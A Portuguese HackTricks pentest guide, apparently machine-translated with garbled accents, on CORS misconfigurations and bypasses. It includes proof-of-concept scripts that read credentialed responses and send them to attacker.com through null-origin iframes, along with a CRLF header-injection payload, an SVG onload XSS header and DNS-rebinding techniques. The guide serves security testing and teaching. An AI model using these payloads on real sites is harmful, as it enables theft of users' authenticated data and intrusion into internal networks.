# CORS - Misconfigura√ß√µes & Bypass

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## O que √© CORS?

O padr√£o Cross-Origin Resource Sharing (CORS) **permite que servidores definam quem pode acessar seus ativos** e **quais m√©todos de requisi√ß√£o HTTP s√£o permitidos** de fontes externas.

Uma pol√≠tica de **mesmo origem** exige que um **servidor que solicita** um recurso e o servidor que hospeda o **recurso** compartilhem o mesmo protocolo (por exemplo, `http://`), nome de dom√≠nio (por exemplo, `internal-web.com`) e **porta** (por exemplo, 80). Sob essa pol√≠tica, apenas p√°ginas da web do mesmo dom√≠nio e porta t√™m acesso aos recursos.

A aplica√ß√£o da pol√≠tica de mesmo origem no contexto de `http://normal-website.com/example/example.html` √© ilustrada da seguinte forma:

| URL acessada                              | Acesso permitido?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Sim: Esquema, dom√≠nio e porta id√™nticos |
| `http://normal-website.com/example2/`     | Sim: Esquema, dom√≠nio e porta id√™nticos |
| `https://normal-website.com/example/`     | N√£o: Esquema e porta diferentes         |
| `http://en.normal-website.com/example/`   | N√£o: Dom√≠nio diferente                  |
| `http://www.normal-website.com/example/`  | N√£o: Dom√≠nio diferente                  |
| `http://normal-website.com:8080/example/` | N√£o: Porta diferente\*                  |

\*O Internet Explorer ignora o n√∫mero da porta na aplica√ß√£o da pol√≠tica de mesmo origem, permitindo assim esse acesso.

### Cabe√ßalho `Access-Control-Allow-Origin`

Esse cabe√ßalho pode permitir **m√∫ltiplas origens**, um valor **`null`** ou um curinga **`*`**. No entanto, **nenhum navegador suporta m√∫ltiplas origens**, e o uso do curinga `*` est√° sujeito a **limita√ß√µes**. (O curinga deve ser usado sozinho, e seu uso juntamente com `Access-Control-Allow-Credentials: true` n√£o √© permitido.)

Esse cabe√ßalho √© **emitido por um servidor** em resposta a uma solicita√ß√£o de recurso de dom√≠nio cruzado iniciada por um site, com o navegador adicionando automaticamente um cabe√ßalho `Origin`.

### Cabe√ßalho `Access-Control-Allow-Credentials`

Por **padr√£o**, requisi√ß√µes de origem cruzada s√£o feitas sem credenciais como cookies ou o cabe√ßalho de Autoriza√ß√£o. No entanto, um servidor de dom√≠nio cruzado pode permitir a leitura da resposta quando credenciais s√£o enviadas, definindo o cabe√ßalho `Access-Control-Allow-Credentials` como **`true`**.

Se definido como `true`, o navegador transmitir√° credenciais (cookies, cabe√ßalhos de autoriza√ß√£o ou certificados de cliente TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight request

### Entendendo as Solicita√ß√µes Pre-flight na Comunica√ß√£o entre Dom√≠nios

Ao iniciar uma solicita√ß√£o entre dom√≠nios sob condi√ß√µes espec√≠ficas, como usar um **m√©todo HTTP n√£o padr√£o** (qualquer coisa al√©m de HEAD, GET, POST), introduzir novos **cabe√ßalhos** ou empregar um valor especial para o **cabe√ßalho Content-Type**, uma solicita√ß√£o pre-flight pode ser necess√°ria. Esta solicita√ß√£o preliminar, utilizando o m√©todo **`OPTIONS`**, serve para informar o servidor sobre as inten√ß√µes da pr√≥xima solicita√ß√£o de origem cruzada, incluindo os m√©todos HTTP e cabe√ßalhos que pretende usar.

O protocolo **Cross-Origin Resource Sharing (CORS)** exige essa verifica√ß√£o pre-flight para determinar a viabilidade da opera√ß√£o de origem cruzada solicitada, verificando os m√©todos, cabe√ßalhos permitidos e a confiabilidade da origem. Para uma compreens√£o detalhada das condi√ß√µes que contornam a necessidade de uma solicita√ß√£o pre-flight, consulte o guia abrangente fornecido pela [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

√â crucial notar que a **aus√™ncia de uma solicita√ß√£o pre-flight n√£o anula a exig√™ncia de que a resposta contenha cabe√ßalhos de autoriza√ß√£o**. Sem esses cabe√ßalhos, o navegador fica incapacitado de processar a resposta da solicita√ß√£o de origem cruzada.

Considere a seguinte ilustra√ß√£o de uma solicita√ß√£o pre-flight destinada a empregar o m√©todo `PUT` junto com um cabe√ßalho personalizado chamado `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Em resposta, o servidor pode retornar cabe√ßalhos indicando os m√©todos aceitos, a origem permitida e outros detalhes da pol√≠tica CORS, conforme mostrado abaixo:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Este cabe√ßalho especifica quais cabe√ßalhos podem ser usados durante a solicita√ß√£o real. Ele √© definido pelo servidor para indicar os cabe√ßalhos permitidos nas solicita√ß√µes do cliente.
* **`Access-Control-Expose-Headers`**: Atrav√©s deste cabe√ßalho, o servidor informa ao cliente sobre quais cabe√ßalhos podem ser expostos como parte da resposta, al√©m dos cabe√ßalhos de resposta simples.
* **`Access-Control-Max-Age`**: Este cabe√ßalho indica por quanto tempo os resultados de uma solicita√ß√£o de pr√©-v√¥o podem ser armazenados em cache. O servidor define o tempo m√°ximo, em segundos, que as informa√ß√µes retornadas por uma solicita√ß√£o de pr√©-v√¥o podem ser reutilizadas.
* **`Access-Control-Request-Headers`**: Usado em solicita√ß√µes de pr√©-v√¥o, este cabe√ßalho √© definido pelo cliente para informar ao servidor sobre quais cabe√ßalhos HTTP o cliente deseja usar na solicita√ß√£o real.
* **`Access-Control-Request-Method`**: Este cabe√ßalho, tamb√©m usado em solicita√ß√µes de pr√©-v√¥o, √© definido pelo cliente para indicar qual m√©todo HTTP ser√° usado na solicita√ß√£o real.
* **`Origin`**: Este cabe√ßalho √© definido automaticamente pelo navegador e indica a origem da solicita√ß√£o de origem cruzada. Ele √© usado pelo servidor para avaliar se a solicita√ß√£o recebida deve ser permitida ou negada com base na pol√≠tica de CORS.

Note que geralmente (dependendo do tipo de conte√∫do e dos cabe√ßalhos definidos) em uma **solicita√ß√£o GET/POST nenhuma solicita√ß√£o de pr√©-v√¥o √© enviada** (a solicita√ß√£o √© enviada **diretamente**), mas se voc√™ quiser acessar os **cabe√ßalhos/corpo da resposta**, deve conter um cabe√ßalho _Access-Control-Allow-Origin_ permitindo isso.\
**Portanto, CORS n√£o protege contra CSRF (mas pode ser √∫til).**

### **Solicita√ß√µes de Rede Local Solicita√ß√£o de pr√©-v√¥o**

1. **`Access-Control-Request-Local-Network`**: Este cabe√ßalho √© inclu√≠do na solicita√ß√£o do cliente para significar que a consulta √© direcionada a um recurso de rede local. Ele serve como um marcador para informar ao servidor que a solicita√ß√£o se origina de dentro da rede local.
2. **`Access-Control-Allow-Local-Network`**: Em resposta, os servidores utilizam este cabe√ßalho para comunicar que o recurso solicitado pode ser compartilhado com entidades fora da rede local. Ele atua como um sinal verde para compartilhar recursos entre diferentes limites de rede, garantindo acesso controlado enquanto mant√©m os protocolos de seguran√ßa.

Uma **resposta v√°lida permitindo a solicita√ß√£o de rede local** precisa ter tamb√©m na resposta o cabe√ßalho `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Note que o IP linux **0.0.0.0** funciona para **bypassar** esses requisitos para acessar localhost, pois esse endere√ßo IP n√£o √© considerado "local".

Tamb√©m √© poss√≠vel **bypassar os requisitos da Rede Local** se voc√™ usar o **endere√ßo IP p√∫blico de um endpoint local** (como o IP p√∫blico do roteador). Porque em v√°rias ocasi√µes, mesmo que o **IP p√∫blico** esteja sendo acessado, se for **da rede local**, o acesso ser√° concedido.
{% endhint %}

## Configura√ß√µes incorretas explor√°veis

Foi observado que a configura√ß√£o de `Access-Control-Allow-Credentials` para **`true`** √© um pr√©-requisito para a maioria dos **ataques reais**. Essa configura√ß√£o permite que o navegador envie credenciais e leia a resposta, aumentando a efic√°cia do ataque. Sem isso, o benef√≠cio de fazer um navegador emitir uma solicita√ß√£o em vez de faz√™-lo pessoalmente diminui, j√° que aproveitar os cookies de um usu√°rio se torna invi√°vel.

### Exce√ß√£o: Explorando a Localiza√ß√£o da Rede como Autentica√ß√£o

Existe uma exce√ß√£o onde a localiza√ß√£o da rede da v√≠tima atua como uma forma de autentica√ß√£o. Isso permite que o navegador da v√≠tima seja usado como um proxy, contornando a autentica√ß√£o baseada em IP para acessar aplica√ß√µes intranet. Esse m√©todo compartilha semelhan√ßas em impacto com o DNS rebinding, mas √© mais simples de explorar.

### Reflex√£o de `Origin` em `Access-Control-Allow-Origin`

O cen√°rio do mundo real onde o valor do cabe√ßalho `Origin` √© refletido em `Access-Control-Allow-Origin` √© teoricamente improv√°vel devido a restri√ß√µes na combina√ß√£o desses cabe√ßalhos. No entanto, desenvolvedores que buscam habilitar CORS para v√°rias URLs podem gerar dinamicamente o cabe√ßalho `Access-Control-Allow-Origin` copiando o valor do cabe√ßalho `Origin`. Essa abordagem pode introduzir vulnerabilidades, particularmente quando um atacante emprega um dom√≠nio com um nome projetado para parecer leg√≠timo, enganando assim a l√≥gica de valida√ß√£o.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Explorando a Origem `null`

A origem `null`, especificada para situa√ß√µes como redirecionamentos ou arquivos HTML locais, ocupa uma posi√ß√£o √∫nica. Algumas aplica√ß√µes colocam essa origem na lista de permiss√µes para facilitar o desenvolvimento local, permitindo inadvertidamente que qualquer site imite uma origem `null` atrav√©s de um iframe isolado, contornando assim as restri√ß√µes de CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### T√©cnicas de Bypass de Express√£o Regular

Ao encontrar uma lista de permiss√µes de dom√≠nio, √© crucial testar oportunidades de bypass, como anexar o dom√≠nio do atacante a um dom√≠nio na lista de permiss√µes ou explorar vulnerabilidades de takeover de subdom√≠nio. Al√©m disso, express√µes regulares usadas para valida√ß√£o de dom√≠nio podem ignorar nuances nas conven√ß√µes de nomenclatura de dom√≠nio, apresentando mais oportunidades de bypass.

### Bypasses Avan√ßados de Express√£o Regular

Padr√µes de regex normalmente se concentram em caracteres alfanum√©ricos, ponto (.) e h√≠fen (-), negligenciando outras possibilidades. Por exemplo, um nome de dom√≠nio elaborado para incluir caracteres interpretados de forma diferente por navegadores e padr√µes de regex pode contornar verifica√ß√µes de seguran√ßa. O tratamento de caracteres de sublinhado em subdom√≠nios pelo Safari, Chrome e Firefox ilustra como tais discrep√¢ncias podem ser exploradas para contornar a l√≥gica de valida√ß√£o de dom√≠nio.

**Para mais informa√ß√µes e configura√ß√µes deste verificador de bypass:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **e** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### De XSS dentro de um subdom√≠nio

Os desenvolvedores frequentemente implementam mecanismos defensivos para proteger contra a explora√ß√£o de CORS, permitindo apenas dom√≠nios que podem solicitar informa√ß√µes. Apesar dessas precau√ß√µes, a seguran√ßa do sistema n√£o √© infal√≠vel. A presen√ßa de at√© mesmo um √∫nico subdom√≠nio vulner√°vel dentro dos dom√≠nios na lista de permiss√µes pode abrir a porta para a explora√ß√£o de CORS atrav√©s de outras vulnerabilidades, como XSS (Cross-Site Scripting).

Para ilustrar, considere o cen√°rio em que um dom√≠nio, `requester.com`, est√° na lista de permiss√µes para acessar recursos de outro dom√≠nio, `provider.com`. A configura√ß√£o do lado do servidor pode parecer algo assim:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Neste cen√°rio, todos os subdom√≠nios de `requester.com` t√™m acesso permitido. No entanto, se um subdom√≠nio, digamos `sub.requester.com`, for comprometido com uma vulnerabilidade XSS, um atacante pode explorar essa fraqueza. Por exemplo, um atacante com acesso a `sub.requester.com` poderia explorar a vulnerabilidade XSS para contornar as pol√≠ticas de CORS e acessar maliciosamente recursos em `provider.com`.

### **Envenenamento de cache do lado do servidor**

[**Desta pesquisa**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

√â poss√≠vel que, ao explorar o envenenamento de cache do lado do servidor atrav√©s da inje√ß√£o de cabe√ßalho HTTP, uma vulnerabilidade de Cross-Site Scripting (XSS) armazenada possa ser induzida. Esse cen√°rio se desenrola quando uma aplica√ß√£o falha em sanitizar o cabe√ßalho `Origin` para caracteres ilegais, criando uma vulnerabilidade particularmente para usu√°rios do Internet Explorer e Edge. Esses navegadores tratam (0x0d) como um terminador de cabe√ßalho HTTP leg√≠timo, levando a vulnerabilidades de inje√ß√£o de cabe√ßalho HTTP.

Considere a seguinte solicita√ß√£o onde o cabe√ßalho `Origin` √© manipulado:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer e Edge interpretam a resposta como:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Enquanto explorar diretamente essa vulnerabilidade fazendo um navegador web enviar um cabe√ßalho malformado n√£o √© vi√°vel, uma solicita√ß√£o elaborada pode ser gerada manualmente usando ferramentas como Burp Suite. Este m√©todo pode levar a um cache do lado do servidor salvando a resposta e, inadvertidamente, servindo-a a outros. O payload elaborado visa alterar o conjunto de caracteres da p√°gina para UTF-7, uma codifica√ß√£o de caracteres frequentemente associada a vulnerabilidades XSS devido √† sua capacidade de codificar caracteres de uma maneira que pode ser executada como script em certos contextos.

Para mais informa√ß√µes sobre vulnerabilidades XSS armazenadas, veja [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Nota**: A explora√ß√£o de vulnerabilidades de inje√ß√£o de cabe√ßalho HTTP, particularmente atrav√©s do envenenamento de cache do lado do servidor, destaca a import√¢ncia cr√≠tica de validar e sanitizar todas as entradas fornecidas pelo usu√°rio, incluindo cabe√ßalhos HTTP. Sempre empregue um modelo de seguran√ßa robusto que inclua valida√ß√£o de entrada para prevenir tais vulnerabilidades.

### **Envenenamento de cache do lado do cliente**

[**Desta pesquisa**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Neste cen√°rio, uma inst√¢ncia de uma p√°gina web refletindo o conte√∫do de um cabe√ßalho HTTP personalizado sem a codifica√ß√£o adequada √© observada. Especificamente, a p√°gina web reflete de volta o conte√∫do inclu√≠do em um cabe√ßalho `X-User-id`, que pode incluir JavaScript malicioso, como demonstrado pelo exemplo onde o cabe√ßalho cont√©m uma tag de imagem SVG projetada para executar c√≥digo JavaScript ao ser carregada.

As pol√≠ticas de Compartilhamento de Recursos de Origem Cruzada (CORS) permitem o envio de cabe√ßalhos personalizados. No entanto, sem que a resposta seja renderizada diretamente pelo navegador devido a restri√ß√µes de CORS, a utilidade de tal inje√ß√£o pode parecer limitada. O ponto cr√≠tico surge ao considerar o comportamento de cache do navegador. Se o cabe√ßalho `Vary: Origin` n√£o for especificado, torna-se poss√≠vel que a resposta maliciosa seja armazenada em cache pelo navegador. Subsequentemente, essa resposta em cache poderia ser renderizada diretamente ao navegar para a URL, contornando a necessidade de renderiza√ß√£o direta na solicita√ß√£o inicial. Esse mecanismo aumenta a confiabilidade do ataque ao aproveitar o cache do lado do cliente.

Para ilustrar esse ataque, um exemplo de JavaScript √© fornecido, projetado para ser executado no ambiente de uma p√°gina web, como atrav√©s de um JSFiddle. Este script realiza uma a√ß√£o simples: envia uma solicita√ß√£o para uma URL especificada com um cabe√ßalho personalizado contendo o JavaScript malicioso. Ap√≥s a conclus√£o bem-sucedida da solicita√ß√£o, ele tenta navegar para a URL de destino, potencialmente acionando a execu√ß√£o do script injetado se a resposta tiver sido armazenada em cache sem o tratamento adequado do cabe√ßalho `Vary: Origin`.

Aqui est√° um resumo do JavaScript usado para executar esse ataque:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, tamb√©m conhecido como Cross-Site Script Inclusion, √© um tipo de vulnerabilidade que se aproveita do fato de que a Pol√≠tica de Mesma Origem (SOP) n√£o se aplica ao incluir recursos usando a tag script. Isso ocorre porque os scripts precisam ser inclu√≠dos de diferentes dom√≠nios. Essa vulnerabilidade permite que um atacante acesse e leia qualquer conte√∫do que foi inclu√≠do usando a tag script.

Essa vulnerabilidade se torna particularmente significativa quando se trata de JavaScript din√¢mico ou JSONP (JSON com Padding), especialmente quando informa√ß√µes de autoridade ambiental, como cookies, s√£o usadas para autentica√ß√£o. Ao solicitar um recurso de um host diferente, os cookies s√£o inclu√≠dos, tornando-os acess√≠veis ao atacante.

Para entender melhor e mitigar essa vulnerabilidade, voc√™ pode usar o plugin BurpSuite dispon√≠vel em [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Este plugin pode ajudar a identificar e abordar potenciais vulnerabilidades XSSI em suas aplica√ß√µes web.

[**Leia mais sobre os diferentes tipos de XSSI e como explor√°-los aqui.**](xssi-cross-site-script-inclusion.md)

Tente adicionar um **`callback`** **parameter** na solicita√ß√£o. Talvez a p√°gina tenha sido preparada para enviar os dados como JSONP. Nesse caso, a p√°gina enviar√° os dados de volta com `Content-Type: application/javascript`, o que contornar√° a pol√≠tica CORS.

![](<../.gitbook/assets/image (856).png>)

### Bypass f√°cil (in√∫til?)

Uma maneira de contornar a restri√ß√£o `Access-Control-Allow-Origin` √© solicitando a uma aplica√ß√£o web que fa√ßa uma solicita√ß√£o em seu nome e envie de volta a resposta. No entanto, nesse cen√°rio, as credenciais da v√≠tima final n√£o ser√£o enviadas, pois a solicita√ß√£o √© feita para um dom√≠nio diferente.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Esta ferramenta fornece um proxy que encaminha sua solicita√ß√£o junto com seus cabe√ßalhos, enquanto tamb√©m falsifica o cabe√ßalho Origin para corresponder ao dom√≠nio solicitado. Isso efetivamente contorna a pol√≠tica CORS. Aqui est√° um exemplo de uso com XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Esta ferramenta oferece uma abordagem alternativa para proxying de solicita√ß√µes. Em vez de passar sua solicita√ß√£o como est√°, o servidor faz sua pr√≥pria solicita√ß√£o com os par√¢metros especificados.

### Bypass de Iframe + Popup

Voc√™ pode **contornar as verifica√ß√µes CORS** como `e.origin === window.origin` criando um **iframe** e **abrindo uma nova janela a partir dele**. Mais informa√ß√µes na p√°gina seguinte:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Rebinding de DNS via TTL

Rebinding de DNS via TTL √© uma t√©cnica usada para contornar certas medidas de seguran√ßa manipulando registros DNS. Veja como funciona:

1. O atacante cria uma p√°gina web e faz a v√≠tima acess√°-la.
2. O atacante ent√£o muda o DNS (IP) de seu pr√≥prio dom√≠nio para apontar para a p√°gina web da v√≠tima.
3. O navegador da v√≠tima armazena em cache a resposta DNS, que pode ter um valor TTL (Time to Live) indicando por quanto tempo o registro DNS deve ser considerado v√°lido.
4. Quando o TTL expira, o navegador da v√≠tima faz uma nova solicita√ß√£o DNS, permitindo que o atacante execute c√≥digo JavaScript na p√°gina da v√≠tima.
5. Ao manter o controle sobre o IP da v√≠tima, o atacante pode coletar informa√ß√µes da v√≠tima sem enviar cookies para o servidor da v√≠tima.

√â importante notar que os navegadores t√™m mecanismos de cache que podem impedir o abuso imediato dessa t√©cnica, mesmo com valores de TTL baixos.

O rebinding de DNS pode ser √∫til para contornar verifica√ß√µes de IP expl√≠citas realizadas pela v√≠tima ou para cen√°rios em que um usu√°rio ou bot permanece na mesma p√°gina por um per√≠odo prolongado, permitindo que o cache expire.

Se voc√™ precisar de uma maneira r√°pida de abusar do rebinding de DNS, pode usar servi√ßos como [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Para executar seu pr√≥prio servidor de rebinding de DNS, voc√™ pode utilizar ferramentas como **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Isso envolve expor sua porta local 53/udp, criar um registro A apontando para ela (por exemplo, ns.example.com) e criar um registro NS apontando para o subdom√≠nio A criado anteriormente (por exemplo, ns.example.com). Qualquer subdom√≠nio do subdom√≠nio ns.example.com ser√° resolvido pelo seu host.

Voc√™ tamb√©m pode explorar um servidor em funcionamento publicamente em [http://rebind.it/singularity.html](http://rebind.it/singularity.html) para uma melhor compreens√£o e experimenta√ß√£o.

### Rebinding de DNS via **DNS Cache Flooding**

Rebinding de DNS via DNS cache flooding √© outra t√©cnica usada para contornar o mecanismo de cache dos navegadores e for√ßar uma segunda solicita√ß√£o DNS. Veja como funciona:

1. Inicialmente, quando a v√≠tima faz uma solicita√ß√£o DNS, ela √© respondida com o endere√ßo IP do atacante.
2. Para contornar a defesa de cache, o atacante utiliza um service worker. O service worker inunda o cache DNS, o que efetivamente exclui o nome do servidor do atacante armazenado em cache.
3. Quando o navegador da v√≠tima faz uma segunda solicita√ß√£o DNS, agora √© respondido com o endere√ßo IP 127.0.0.1, que normalmente se refere ao localhost.

Ao inundar o cache DNS com o service worker, o atacante pode manipular o processo de resolu√ß√£o DNS e for√ßar o navegador da v√≠tima a fazer uma segunda solicita√ß√£o, desta vez resolvendo para o endere√ßo IP desejado pelo atacante.

### Rebinding de DNS via **Cache**

Outra maneira de contornar a defesa de cache √© utilizando m√∫ltiplos endere√ßos IP para o mesmo subdom√≠nio no provedor de DNS. Veja como funciona:

1. O atacante configura dois registros A (ou um √∫nico registro A com dois IPs) para o mesmo subdom√≠nio no provedor de DNS.
2. Quando um navegador verifica esses registros, ele recebe ambos os endere√ßos IP.
3. Se o navegador decidir usar o endere√ßo IP do atacante primeiro, o atacante pode servir um payload que realiza solicita√ß√µes HTTP para o mesmo dom√≠nio.
4. No entanto, uma vez que o atacante obt√©m o endere√ßo IP da v√≠tima, ele para de responder ao navegador da v√≠tima.
5. O navegador da v√≠tima, ao perceber que o dom√≠nio n√£o est√° respondendo, passa a usar o segundo endere√ßo IP fornecido.
6. Ao acessar o segundo endere√ßo IP, o navegador contorna a Pol√≠tica de Mesma Origem (SOP), permitindo que o atacante abuse disso e colete e exfiltre informa√ß√µes.

Essa t√©cnica aproveita o comportamento dos navegadores quando m√∫ltiplos endere√ßos IP s√£o fornecidos para um dom√≠nio. Ao controlar estrategicamente as respostas e manipular a escolha do endere√ßo IP do navegador, um atacante pode explorar a SOP e acessar informa√ß√µes da v√≠tima.

{% hint style="warning" %}
Observe que, para acessar o localhost, voc√™ deve tentar rebind **127.0.0.1** no Windows e **0.0.0.0** no Linux.\
Provedores como godaddy ou cloudflare n√£o me permitiram usar o IP 0.0.0.0, mas o AWS route53 me permitiu criar um registro A com 2 IPs, sendo um deles "0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

Para mais informa√ß√µes, voc√™ pode conferir [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Outros Bypasses Comuns

* Se **IPs internos n√£o s√£o permitidos**, eles podem **esquecer de proibir 0.0.0.0** (funciona no Linux e Mac)
* Se **IPs internos n√£o s√£o permitidos**, responda com um **CNAME** para **localhost** (funciona no Linux e Mac)
* Se **IPs internos n√£o s√£o permitidos** como respostas DNS, voc√™ pode responder com **CNAMEs para servi√ßos internos** como www.corporate.internal.

### Rebinding de DNS Armazenado

Voc√™ pode encontrar mais informa√ß√µes sobre as t√©cnicas de bypass anteriores e como usar a seguinte ferramenta na palestra [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) √© uma ferramenta para realizar ataques de [rebinding de DNS](https://en.wikipedia.org/wiki/DNS\_rebinding). Ela inclui os componentes necess√°rios para rebindar o endere√ßo IP do nome do servidor de ataque DNS para o endere√ßo IP da m√°quina alvo e para servir payloads de ataque para explorar software vulner√°vel na m√°quina alvo.

### Prote√ß√£o Real contra Rebinding de DNS

* Use TLS em servi√ßos internos
* Solicite autentica√ß√£o para acessar dados
* Valide o cabe√ßalho Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Proposta para sempre enviar uma solicita√ß√£o pr√©via quando servidores p√∫blicos desejam acessar servidores internos

## **Ferramentas**

**Fuzz poss√≠veis configura√ß√µes incorretas nas pol√≠ticas CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Refer√™ncias

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

